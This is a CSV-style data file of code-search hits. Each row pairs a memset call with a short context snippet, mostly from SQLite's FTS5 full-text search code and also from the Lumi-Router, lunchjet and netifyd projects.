2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aFreq, 0, sizeof(double) * pData->nPhrase);",120,1,"  if( rc==SQLITE_OK ){
    aFreq = pData->aFreq;
    memset(aFreq, 0, sizeof(double) * pData->nPhrase);
    rc = pApi->xInstCount(pFts, &nInst);
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pBuf, 0, sizeof(Fts5Buffer));",120,1,"static void sqlite3Fts5BufferFree(Fts5Buffer *pBuf){
  sqlite3_free(pBuf->p);
  memset(pBuf, 0, sizeof(Fts5Buffer));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pIter, 0, sizeof(*pIter));",120,1,"  Fts5PoslistReader *pIter        /* Iterator object to initialize */
){
  memset(pIter, 0, sizeof(*pIter));
  pIter->a = a;
  pIter->n = n;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, (size_t)nByte);",120,1,"      if( nByte>0 ) *pRc = SQLITE_NOMEM;
    }else{
      memset(pRet, 0, (size_t)nByte);
    }
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, sizeof(Fts5Config));",120,1,"  *ppOut = pRet = (Fts5Config*)sqlite3_malloc(sizeof(Fts5Config));
  if( pRet==0 ) return SQLITE_NOMEM;
  memset(pRet, 0, sizeof(Fts5Config));
  pRet->db = db;
  pRet->iCookie = -1;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aIter, 0, sizeof(Fts5PoslistReader) * pPhrase->nTerm);",120,1,"    if( !aIter ) return SQLITE_NOMEM;
  }
  memset(aIter, 0, sizeof(Fts5PoslistReader) * pPhrase->nTerm);

  /* Initialize a term iterator for each term in the phrase */
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(Fts5LookaheadReader));",120,1,"  Fts5LookaheadReader *p          /* Iterator object to initialize */
){
  memset(p, 0, sizeof(Fts5LookaheadReader));
  p->a = a;
  p->n = n;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aStatic, 0, sizeof(aStatic));",120,1,"    a = (Fts5NearTrimmer*)sqlite3Fts5MallocZero(&rc, nByte);
  }else{
    memset(aStatic, 0, sizeof(aStatic));
  }
  if( rc!=SQLITE_OK ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pSyn, 0, (size_t)nByte);",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(pSyn, 0, (size_t)nByte);
      pSyn->zTerm = ((char*)pSyn) + sizeof(Fts5ExprTerm) + sizeof(Fts5Buffer);
      memcpy(pSyn->zTerm, pToken, nToken);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"if( pPhrase==0 ) memset(pNew, 0, sizeof(Fts5ExprPhrase));",120,1,"        rc = SQLITE_NOMEM;
      }else{
        if( pPhrase==0 ) memset(pNew, 0, sizeof(Fts5ExprPhrase));
        pCtx->pPhrase = pPhrase = pNew;
        pNew->nTerm = nNew - SZALLOC;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTerm, 0, sizeof(Fts5ExprTerm));",120,1,"    if( rc==SQLITE_OK ){
      pTerm = &pPhrase->aTerm[pPhrase->nTerm++];
      memset(pTerm, 0, sizeof(Fts5ExprTerm));
      pTerm->zTerm = sqlite3Fts5Strndup(&rc, pToken, nToken);
    }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&sCtx, 0, sizeof(TokenCtx));",120,1,"  char *z = 0;

  memset(&sCtx, 0, sizeof(TokenCtx));
  sCtx.pPhrase = pAppend;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aArr, 0, sizeof(aArr));",120,1,"    return;
  }
  memset(aArr, 0, sizeof(aArr));
  sqlite3Fts5UnicodeCatParse(""L*"", aArr);
  sqlite3Fts5UnicodeCatParse(""N*"", aArr);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, sizeof(Fts5PoslistPopulator)*pExpr->nPhrase);",120,1,"  if( pRet ){
    int i;
    memset(pRet, 0, sizeof(Fts5PoslistPopulator)*pExpr->nPhrase);
    for(i=0; i<pExpr->nPhrase; i++){
      Fts5Buffer *pBuf = &pExpr->apExprPhrase[i]->poslist;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, sizeof(Fts5Hash));",120,1,"  }else{
    sqlite3_int64 nByte;
    memset(pNew, 0, sizeof(Fts5Hash));
    pNew->pnByte = pnByte;
    pNew->eDetail = pConfig->eDetail;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew->aSlot, 0, (size_t)nByte);",120,1,"      rc = SQLITE_NOMEM;
    }else{
      memset(pNew->aSlot, 0, (size_t)nByte);
    }
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pHash->aSlot, 0, pHash->nSlot * sizeof(Fts5HashEntry*));",120,1,"    }
  }
  memset(pHash->aSlot, 0, pHash->nSlot * sizeof(Fts5HashEntry*));
  pHash->nEntry = 0;
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(apNew, 0, nNew*sizeof(Fts5HashEntry*));",120,1,"  apNew = (Fts5HashEntry**)sqlite3_malloc64(nNew*sizeof(Fts5HashEntry*));
  if( !apNew ) return SQLITE_NOMEM;
  memset(apNew, 0, nNew*sizeof(Fts5HashEntry*));

  for(i=0; i<pHash->nSlot; i++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(Fts5HashEntry));",120,1,"    p = (Fts5HashEntry*)sqlite3_malloc64(nByte);
    if( !p ) return SQLITE_NOMEM;
    memset(p, 0, sizeof(Fts5HashEntry));
    p->nAlloc = (int)nByte;
    zKey = fts5EntryKey(p);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(ap, 0, sizeof(Fts5HashEntry*) * nMergeSlot);",120,1,"  ap = sqlite3_malloc64(sizeof(Fts5HashEntry*) * nMergeSlot);
  if( !ap ) return SQLITE_NOMEM;
  memset(ap, 0, sizeof(Fts5HashEntry*) * nMergeSlot);

  for(iSlot=0; iSlot<pHash->nSlot; iSlot++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pStruct->aLevel[nLevel], 0, sizeof(Fts5StructureLevel));",120,1,"    pStruct = sqlite3_realloc64(pStruct, nByte);
    if( pStruct ){
      memset(&pStruct->aLevel[nLevel], 0, sizeof(Fts5StructureLevel));
      pStruct->nLevel++;
      *ppStruct = pStruct;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aNew[pLvl->nSeg], 0, sizeof(Fts5StructureSegment) * nExtra);",120,1,"    if( aNew ){
      if( bInsert==0 ){
        memset(&aNew[pLvl->nSeg], 0, sizeof(Fts5StructureSegment) * nExtra);
      }else{
        int nMove = pLvl->nSeg * sizeof(Fts5StructureSegment);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aNew, 0, sizeof(Fts5StructureSegment) * nExtra);",120,1,"        int nMove = pLvl->nSeg * sizeof(Fts5StructureSegment);
        memmove(&aNew[nExtra], aNew, nMove);
        memset(aNew, 0, sizeof(Fts5StructureSegment) * nExtra);
      }
      pLvl->aSeg = aNew;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pData->p[pData->nn], 0, FTS5_DATA_PADDING);",120,1,"  if( p->rc==SQLITE_OK ){
    /* TODO: Do we need this if the leaf-index is appended? Probably... */
    memset(&pData->p[pData->nn], 0, FTS5_DATA_PADDING);
    p->rc = fts5StructureDecode(pData->p, pData->nn, &iCookie, &pRet);
    if( p->rc==SQLITE_OK && (pConfig->pgsz==0 || pConfig->iCookie!=iCookie) ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&buf, 0, sizeof(Fts5Buffer));",120,1,"
    assert( pStruct->nSegment==fts5StructureCountSegments(pStruct) );
    memset(&buf, 0, sizeof(Fts5Buffer));

    /* Append the current configuration cookie */
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&buf, 0, sizeof(buf));",120,1,"  int rc = SQLITE_OK;
  Fts5Buffer buf;
  memset(&buf, 0, sizeof(buf));
  fts5DebugStructure(&rc, &buf, pStruct);
  fprintf(stdout, ""%s: %s\n"", zCaption, buf.p);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pLvl, 0, sizeof(Fts5DlidxLvl));",120,1,"      if( pLvl[1].bEof==0 ){
        fts5DataRelease(pLvl->pData);
        memset(pLvl, 0, sizeof(Fts5DlidxLvl));
        pLvl->pData = fts5DataRead(p,
            FTS5_DLIDX_ROWID(pIter->iSegid, iLvl, pLvl[1].iLeafPgno)
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pChild, 0, sizeof(Fts5DlidxLvl));",120,1,"      Fts5DlidxLvl *pChild = &pLvl[-1];
      fts5DataRelease(pChild->pData);
      memset(pChild, 0, sizeof(Fts5DlidxLvl));
      pChild->pData = fts5DataRead(p,
          FTS5_DLIDX_ROWID(pIter->iSegid, i-1, pLvl->iLeafPgno)
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pIter, 0, sizeof(Fts5SegIter));",120,1,"  fts5DlidxIterFree(pIter->pDlidx);
  sqlite3_free(pIter->aRowidOffset);
  memset(pIter, 0, sizeof(Fts5SegIter));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pBuf->p[pBuf->n+pSeg->nPos], 0, FTS5_DATA_ZERO_PADDING);",120,1,"){
  if( 0==fts5BufferGrow(&p->rc, pBuf, pSeg->nPos+FTS5_DATA_ZERO_PADDING) ){
    memset(&pBuf->p[pBuf->n+pSeg->nPos], 0, FTS5_DATA_ZERO_PADDING);
    if( pColset==0 ){
      fts5ChunkIterate(p, pSeg, (void*)pBuf, fts5PoslistCallback);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aUsed, 0, sizeof(aUsed));",120,1,"      int i;
      u32 mask;
      memset(aUsed, 0, sizeof(aUsed));
      for(iLvl=0; iLvl<pStruct->nLevel; iLvl++){
        for(iSeg=0; iSeg<pStruct->aLevel[iLvl].nSeg; iSeg++){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&aDlidx[pWriter->nDlidx], 0, nByte);",120,1,"    }else{
      size_t nByte = sizeof(Fts5DlidxWriter) * (nLvl - pWriter->nDlidx);
      memset(&aDlidx[pWriter->nDlidx], 0, nByte);
      pWriter->aDlidx = aDlidx;
      pWriter->nDlidx = nLvl;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pWriter, 0, sizeof(Fts5SegWriter));",120,1,"  const int nBuffer = p->pConfig->pgsz + FTS5_DATA_PADDING;

  memset(pWriter, 0, sizeof(Fts5SegWriter));
  pWriter->iSegid = iSegid;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pWriter->writer.buf.p, 0, 4);",120,1,"  if( p->rc==SQLITE_OK ){
    /* Initialize the 4-byte leaf-page header to 0x00. */
    memset(pWriter->writer.buf.p, 0, 4);
    pWriter->writer.buf.n = 4;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&writer, 0, sizeof(Fts5SegWriter));",120,1,"  assert( pLvl->nMerge<=pLvl->nSeg );

  memset(&writer, 0, sizeof(Fts5SegWriter));
  memset(&term, 0, sizeof(Fts5Buffer));
  if( pLvl->nMerge ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&term, 0, sizeof(Fts5Buffer));",120,1,"
  memset(&writer, 0, sizeof(Fts5SegWriter));
  memset(&term, 0, sizeof(Fts5Buffer));
  if( pLvl->nMerge ){
    pLvlOut = &pStruct->aLevel[iLvl+1];
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pBuf->p[pBuf->n], 0, FTS5_DATA_ZERO_PADDING);",120,1,"    fts5BufferSafeAppendVarint(pBuf, nData*2);
    fts5BufferSafeAppendBlob(pBuf, pMulti->base.pData, nData);
    memset(&pBuf->p[pBuf->n], 0, FTS5_DATA_ZERO_PADDING);
  }
}
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&out, 0, sizeof(out));",120,1,"
  Fts5Buffer out;
  memset(&out, 0, sizeof(out));
  sqlite3Fts5BufferSize(&p->rc, &out, p1->n + p2->n);
  if( p->rc ) return;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&writer, 0, sizeof(writer));",120,1,"        i64 iPrev = 0;
        Fts5PoslistWriter writer;
        memset(&writer, 0, sizeof(writer));

        /* See the earlier comment in this function for an explanation of why
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&out.p[out.n], 0, FTS5_DATA_ZERO_PADDING);",120,1,"    fts5BufferFree(p1);
    fts5BufferFree(&tmp);
    memset(&out.p[out.n], 0, FTS5_DATA_ZERO_PADDING);
    *p1 = out;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&doclist, 0, sizeof(doclist));",120,1,"    int bNewTerm = 1;

    memset(&doclist, 0, sizeof(doclist));
    fts5MultiIterNew(p, pStruct, flags, pColset, pToken, nToken, -1, 0, &p1);
    fts5IterSetOutputCb(&p->rc, p1);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&s, 0, sizeof(Fts5Structure));",120,1,"  fts5StructureInvalidate(p);
  fts5IndexDiscardData(p);
  memset(&s, 0, sizeof(Fts5Structure));
  fts5DataWrite(p, FTS5_AVERAGES_ROWID, (const u8*)"""", 0);
  fts5StructureWrite(p, &s);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(anSize, 0, sizeof(i64) * nCol);",120,1,"
  *pnRow = 0;
  memset(anSize, 0, sizeof(i64) * nCol);
  pData = fts5DataRead(p, FTS5_AVERAGES_ROWID);
  if( p->rc==SQLITE_OK && pData->nn ){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&s, 0, sizeof(Fts5Buffer));",120,1,"  assert( nArg==2 );
  UNUSED_PARAM(nArg);
  memset(&s, 0, sizeof(Fts5Buffer));
  iRowid = sqlite3_value_int64(apVal[0]);

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&lvl, 0, sizeof(Fts5DlidxLvl));",120,1,"    dlidx.nn = n;

    memset(&lvl, 0, sizeof(Fts5DlidxLvl));
    lvl.pData = &dlidx;
    lvl.iLeafPgno = iPgno;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr, 0, (size_t)nByte);",120,1,"    if( pCsr ){
      Fts5Global *pGlobal = pTab->pGlobal;
      memset(pCsr, 0, (size_t)nByte);
      pCsr->aColumnSize = (int*)&pCsr[1];
      pCsr->pNext = pGlobal->pCsr;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pCsr->ePlan, 0, sizeof(Fts5Cursor) - ((u8*)&pCsr->ePlan - (u8*)pCsr));",120,1,"
  sqlite3Fts5IndexCloseReader(pTab->p.pIndex);
  memset(&pCsr->ePlan, 0, sizeof(Fts5Cursor) - ((u8*)&pCsr->ePlan - (u8*)pCsr));
}

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pSorter, 0, (size_t)nByte);",120,1,"  pSorter = (Fts5Sorter*)sqlite3_malloc64(nByte);
  if( pSorter==0 ) return SQLITE_NOMEM;
  memset(pSorter, 0, (size_t)nByte);
  pSorter->nIdx = nPhrase;

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&pCsr->ePlan, 0, sizeof(Fts5Cursor) - ((u8*)&pCsr->ePlan-(u8*)pCsr));",120,1,"  if( pCsr->ePlan ){
    fts5FreeCursorComponents(pCsr);
    memset(&pCsr->ePlan, 0, sizeof(Fts5Cursor) - ((u8*)&pCsr->ePlan-(u8*)pCsr));
  }

"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&val, 0, sizeof(Fts5Buffer));",120,1,"  Fts5Buffer val;

  memset(&val, 0, sizeof(Fts5Buffer));
  switch( ((Fts5Table*)(pCsr->base.pVtab))->pConfig->eDetail ){
    case FTS5_DETAIL_FULL:
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pAux, 0, (size_t)nByte);",120,1,"    pAux = (Fts5Auxiliary*)sqlite3_malloc64(nByte);
    if( pAux ){
      memset(pAux, 0, (size_t)nByte);
      pAux->zFunc = (char*)&pAux[1];
      memcpy(pAux->zFunc, zName, nName);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pNew, 0, (size_t)nByte);",120,1,"  pNew = (Fts5TokenizerModule*)sqlite3_malloc64(nByte);
  if( pNew ){
    memset(pNew, 0, (size_t)nByte);
    pNew->zName = (char*)&pNew[1];
    memcpy(pNew->zName, zName, nName);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pTokenizer, 0, sizeof(fts5_tokenizer));",120,1,"    *ppUserData = pMod->pUserData;
  }else{
    memset(pTokenizer, 0, sizeof(fts5_tokenizer));
    rc = SQLITE_ERROR;
  }
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pGlobal, 0, sizeof(Fts5Global));",120,1,"  }else{
    void *p = (void*)pGlobal;
    memset(pGlobal, 0, sizeof(Fts5Global));
    pGlobal->db = db;
    pGlobal->api.iVersion = 2;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&ctx, 0, sizeof(Fts5InsertCtx));",120,1,"  int rc, rc2;

  memset(&ctx, 0, sizeof(Fts5InsertCtx));
  ctx.pStorage = p;
  rc = sqlite3Fts5StorageDeleteAll(p);
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(&ctx, 0, sizeof(Fts5IntegrityCtx));",120,1,"  int bUseCksum;

  memset(&ctx, 0, sizeof(Fts5IntegrityCtx));
  ctx.pConfig = p->pConfig;
  aTotalSize = (i64*)sqlite3_malloc64(pConfig->nCol*(sizeof(int)+sizeof(i64)));
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(aTotalSize, 0, sizeof(i64) * pConfig->nCol);",120,1,"  if( !aTotalSize ) return SQLITE_NOMEM;
  aColSize = (int*)&aTotalSize[pConfig->nCol];
  memset(aTotalSize, 0, sizeof(i64) * pConfig->nCol);

  bUseCksum = (pConfig->eContent==FTS5_CONTENT_NORMAL
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(AsciiTokenizer));",120,1,"    }else{
      int i;
      memset(p, 0, sizeof(AsciiTokenizer));
      memcpy(p->aTokenChar, aAsciiTokenChar, sizeof(aAsciiTokenChar));
      for(i=0; rc==SQLITE_OK && i<nArg; i+=2){
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(p, 0, sizeof(Unicode61Tokenizer));",120,1,"      const char *zCat = ""L* N* Co"";
      int i;
      memset(p, 0, sizeof(Unicode61Tokenizer));

      p->eRemoveDiacritic = FTS5_REMOVE_DIACRITICS_SIMPLE;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pRet, 0, sizeof(PorterTokenizer));",120,1,"  pRet = (PorterTokenizer*)sqlite3_malloc(sizeof(PorterTokenizer));
  if( pRet ){
    memset(pRet, 0, sizeof(PorterTokenizer));
    rc = pApi->xFindTokenizer(pApi, zBase, &pUserdata, &pRet->tokenizer);
  }else{
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->aCnt, 0, nCol * sizeof(i64));",120,1,"
      sqlite3Fts5BufferSet(&rc, &pCsr->term, nTerm, (const u8*)zTerm);
      memset(pCsr->aCnt, 0, nCol * sizeof(i64));
      memset(pCsr->aDoc, 0, nCol * sizeof(i64));
      pCsr->iCol = 0;
"
2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\sqlite3\sqlite3.c,"memset(pCsr->aDoc, 0, nCol * sizeof(i64));",120,1,"      sqlite3Fts5BufferSet(&rc, &pCsr->term, nTerm, (const u8*)zTerm);
      memset(pCsr->aCnt, 0, nCol * sizeof(i64));
      memset(pCsr->aDoc, 0, nCol * sizeof(i64));
      pCsr->iCol = 0;

"
2021\Lumi-Router-JN5169\Source\app_reporting.c,Dataset Download,../../Dataset Download/2021\Lumi-Router-JN5169\Source\app_reporting.c,"memset(asSavedReports, 0, sizeof(asSavedReports));",120,1,"    DBG_vPrintf(TRACE_REPORT, ""Loading default configuration for reports\n"");

    memset(asSavedReports, 0, sizeof(asSavedReports));

    for (i = 0; i < ZCL_NUMBER_OF_REPORTS; i++) {
"
2021\Lumi-Router-JN5169\Source\app_zcl_task.c,Dataset Download,../../Dataset Download/2021\Lumi-Router-JN5169\Source\app_zcl_task.c,"memset(&sLumiRouter, 0, sizeof(APP_tsLumiRouter));",120,1,"        if (psCallBackMessage->u8CommandId == E_CLD_BASIC_CMD_RESET_TO_FACTORY_DEFAULTS) {
            DBG_vPrintf(TRACE_ZCL, ""Basic Factory Reset Received\n"");
            memset(&sLumiRouter, 0, sizeof(APP_tsLumiRouter));
            APP_ZCL_eRegisterEndPoint(&APP_ZCL_cbEndpointCallback, &sLumiRouter);
            APP_ZCL_vDeviceSpecific_Init();
"
2021\lunchjet\src\rc_car_server\main.cpp,Dataset Download,../../Dataset Download/2021\lunchjet\src\rc_car_server\main.cpp,"memset(&sa, 0, sizeof(sa));",120,1,"{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigfillset(&sa.sa_mask);
"
2021\netifyd\include\nd-json.h,Dataset Download,../../Dataset Download/2021\netifyd\include\nd-json.h,"memset(&stats, 0, sizeof(nd_agent_stats));",120,1,"        sink_queue_max_size_kb(0)
    {
        memset(&stats, 0, sizeof(nd_agent_stats));
    }

"
2021\netifyd\include\nd-netlink.h,Dataset Download,../../Dataset Download/2021\netifyd\include\nd-netlink.h,"length(0) { memset(&address, 0, sizeof(struct sockaddr_storage)); }",120,1,"public:
    ndNetlinkNetworkAddr() :
        length(0) { memset(&address, 0, sizeof(struct sockaddr_storage)); }
    ndNetlinkNetworkAddr(const struct sockaddr_storage *addr, uint8_t length = 0) :
        length(length) { memcpy(&address, addr, sizeof(struct sockaddr_storage)); }
"
2021\netifyd\include\netifyd.h,Dataset Download,../../Dataset Download/2021\netifyd\include\netifyd.h,"memset(&pkt, 0, sizeof(struct pkt_t));",120,1,"
    inline void reset(void) {
        memset(&pkt, 0, sizeof(struct pkt_t));
    }
} nd_packet_stats;
"
2021\netifyd\src\nd-capture.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-capture.cpp,"memset(stats, 0, sizeof(nd_packet_stats));",120,1,"    threads_dpi(threads_dpi), dpi_thread_id(rand() % threads_dpi.size())
{
    memset(stats, 0, sizeof(nd_packet_stats));

    nd_iface_name(iface->second, tag);
"
2021\netifyd\src\nd-capture.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-capture.cpp,"memset(&tv, 0, sizeof(struct timeval));",120,1,"                FD_SET(pcap_fd, &fds_read);

                memset(&tv, 0, sizeof(struct timeval));

                if (pkt_queue.empty()) tv.tv_sec = 1;
"
2021\netifyd\src\nd-capture.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-capture.cpp,"memset(pcap_errbuf, 0, PCAP_ERRBUF_SIZE);",120,1,"    pcap_t *pcap_new = NULL;

    memset(pcap_errbuf, 0, PCAP_ERRBUF_SIZE);

    if (pcap_file.size()) {
"
